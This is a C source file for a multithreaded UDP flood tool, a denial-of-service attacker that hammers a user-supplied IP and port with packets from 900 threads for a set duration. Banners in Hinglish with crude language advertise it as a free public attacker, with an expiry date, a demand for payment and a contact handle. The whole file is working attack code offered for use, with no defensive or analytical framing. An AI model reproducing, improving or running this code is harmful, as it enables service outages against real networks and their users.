#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <pthread.h>
#include <stdatomic.h>

#define EXPIRY_DATE "2025-10-10"
#define PACKET_SIZE 100
#define MAX_SOCKETS 9
#define THREAD_COUNT 900

atomic_ulong data_sent_bytes = 0;
atomic_ulong packet_sent_count = 0;

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

void print_entry_banner() {
    printf("\n\n");
    printf("\033[1;35m╔════════════════════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║                                                                                ║\033[0m\n");
    printf("\033[1;35m║                \033[1;36m★ ★ ★ \033[1;32mW E L C O M E   T O   T H E   R I T I K LALA KA BAAP \033[1;36m★ ★ ★               ║\033[0m\n");
    printf("\033[1;35m║                                                                                ║\033[0m\n");
    printf("\033[1;35m║                      \033[1;33m★ \033[1;31mR I T I K X Y Z KA LAND  B H A I.  K A  S Y S T E M \033[1;33m★                      ║\033[0m\n");
    printf("\033[1;35m║                                                                                ║\033[0m\n");
    printf("\033[1;35m║     \033[1;34m\"Jo system ke naam se dar gaya... samajh lo vo server marr gaya!\"     ║\033[0m\n");
    printf("\033[1;35m║                                                                                ║\033[0m\n");
    printf("\033[1;35m╚════════════════════════════════════════════════════════════════════════════════╝\033[0m\n\n");

    sleep(3);
    printf("\033[2J\033[H"); // Clear screen
}

void print_stylish_text() {
    printf("\033[1;35m╔════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║ \033[1;36m★ \033[1;32mP A P A   R I T I K X Y Z  \033[1;36m★ \033[1;35m║\033[0m\n");
    printf("\033[1;35m╠════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ Expiry Timer:     \033[1;32m%s                           \033[1;35m║\033[0m\n", EXPIRY_DATE);
    printf("\033[1;35m║ \033[1;33m✦ Warning:          \033[1;31m[System hilne wala hai bhadwe!]         \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ Status:           \033[1;32mFREE PUBLIC UDP HILAWAH ATTACKER        \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ Note:             \033[1;33mExpire hone ke baad paise de bhadwe!    \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33m✦ Contact:          \033[1;32m@Ritikxyz099                             \033[1;35m║\033[0m\n");
    printf("\033[1;35m╚════════════════════════════════════════════════════════════╝\033[0m\n\n");
}

int is_expired() {
    int y, m, d;
    sscanf(EXPIRY_DATE, "%d-%d-%d", &y, &m, &d);
    time_t now = time(NULL);
    struct tm *cur = localtime(&now);
    return (cur->tm_year + 1900 > y ||
           (cur->tm_year + 1900 == y && cur->tm_mon + 1 > m) ||
           (cur->tm_year + 1900 == y && cur->tm_mon + 1 == m && cur->tm_mday > d));
}

void* send_udp_packets(void* arg) {
    AttackParams *params = (AttackParams *)arg;
    struct sockaddr_in addr;
    char payload[PACKET_SIZE];
    memset(payload, 'X', PACKET_SIZE);

    int sockets[MAX_SOCKETS];
    for (int i = 0; i < MAX_SOCKETS; i++) {
        if ((sockets[i] = socket(AF_INET, SOCK_DGRAM, 0)) < 0) pthread_exit(NULL);
        fcntl(sockets[i], F_SETFL, O_NONBLOCK);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &addr.sin_addr);

    time_t start = time(NULL);
    while (time(NULL) - start < params->duration) {
        for (int i = 0; i < MAX_SOCKETS; i++) {
            sendto(sockets[i], payload, PACKET_SIZE, 0, (struct sockaddr *)&addr, sizeof(addr));
            atomic_fetch_add(&data_sent_bytes, PACKET_SIZE);
            atomic_fetch_add(&packet_sent_count, 1);
        }
    }

    for (int i = 0; i < MAX_SOCKETS; i++) close(sockets[i]);
    pthread_exit(NULL);
}

void* display_live_stats(void* arg) {
    int duration = *(int*)arg;

    for (int remaining = duration; remaining > 0; remaining--) {
        sleep(1);
        double gb_sent = atomic_load(&data_sent_bytes) / (1024.0 * 1024.0 * 1024.0);
        unsigned long pkts = atomic_load(&packet_sent_count);
        double speed_mbps = (gb_sent * 1024 * 8) / (duration - remaining + 1);

        printf("\r\033[1;36m[ LIVE STATS ] Time Left: %3d sec | Data Sent: %.2f GB | Packets: %-10lu | Speed: %.2f Mbps\033[0m",
               remaining, gb_sent, pkts, speed_mbps);
        fflush(stdout);
    }

    printf("\r\033[1;32m[ ATTACK DONE  ] Total Sent: %.2f GB | Packets: %lu\033[0m\n",
           atomic_load(&data_sent_bytes) / (1024.0 * 1024.0 * 1024.0),
           atomic_load(&packet_sent_count));
    return NULL;
}

int main(int argc, char *argv[]) {
    if (strcmp(argv[0], "./Ritik") != 0) {
        fprintf(stderr, "Error: Rename binary to 'Ritik' and run again.\n");
        return 1;
    }

    print_entry_banner();

    if (is_expired()) {
        fprintf(stderr, "\033[1;31mERROR: File expired. Contact @Ritikxyz099I for new version.\033[0m\n");
        return 1;
    }

    print_stylish_text();

    if (argc < 4) {
        printf("Usage: %s <IP> <Port> <Time>\n", argv[0]);
        return 1;
    }

    AttackParams params;
    strncpy(params.ip, argv[1], sizeof(params.ip) - 1);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    pthread_t stat_thread;
    pthread_create(&stat_thread, NULL, display_live_stats, &params.duration);

    pthread_t threads[THREAD_COUNT];
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_udp_packets, &params);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_join(stat_thread, NULL);
    printf("\033[1;34mAttack Finished. Contact @Ritikxyz099I for more.\033[0m\n");
    return 0;
}
